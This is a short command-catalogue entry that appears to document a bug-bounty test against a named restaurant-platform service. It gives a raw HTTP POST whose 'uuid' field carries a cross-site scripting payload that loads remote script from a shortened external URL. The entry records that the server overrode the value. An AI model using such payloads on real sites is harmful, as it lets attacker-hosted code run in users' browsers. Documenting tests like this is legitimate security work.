---
data: >-
  POST /c/user HTTP/1.1

  Host: app.upserve.com

  Connection: close

  Content-Length: 118

  Accept: application/json

  Origin: https://app.upserve.com

  X-Requested-With: XMLHttpRequest

  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36

  Content-Type: application/json

  DNT: 1

  Referer: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi

  Accept-Language: en-US,en;q=0.8

  Cookie: <x>


  {"uuid":"</script><script
  src=//is.gd/z0i2sU>","email":"asuka@asuka.h1","brand_pretty_url":"ace-wasabis-rock-n-roll-sushi"}
tags:
  - http
  - post
  - json
  - xss
type: command
executor: bash
platforms:
  - Web
id: bdea13c4-ee3c-41cd-820d-6609303d84a2
created_at: '2025-12-13T23:56:20.176Z'
updated_at: '2025-12-13T23:56:20.176Z'
verified: false
validated: true
submitted: true
---
# POST Malicious UUID JSON

## Command

```bash
POST /c/user HTTP/1.1
Host: app.upserve.com
Connection: close
Content-Length: 118
Accept: application/json
Origin: https://app.upserve.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Content-Type: application/json
DNT: 1
Referer: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi
Accept-Language: en-US,en;q=0.8
Cookie: <x>

{"uuid":"</script><script src=//is.gd/z0i2sU>","email":"asuka@asuka.h1","brand_pretty_url":"ace-wasabis-rock-n-roll-sushi"}
```

## Description

Alternative POST request in JSON format attempting to submit malicious UUID, but server overrides it.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `uuid` | Attempts to inject XSS payload | Yes |
| `email` | Specifies the user's email | Yes |
| `brand_pretty_url` | Specifies the brand URL | Yes |

## Examples

### Basic Usage

```bash
POST /c/user HTTP/1.1
Host: app.upserve.com
... (as above)
```

### Advanced Usage

Adjust cookie or user-agent as needed.

## Expected Output

HTTP 201 Created with server-generated UUID instead of payload.

## Related

- [[commands/post-malicious-uuid-form-urlencoded]]
- [[procedures/Submit-Malicious-UUID-via-POST]]
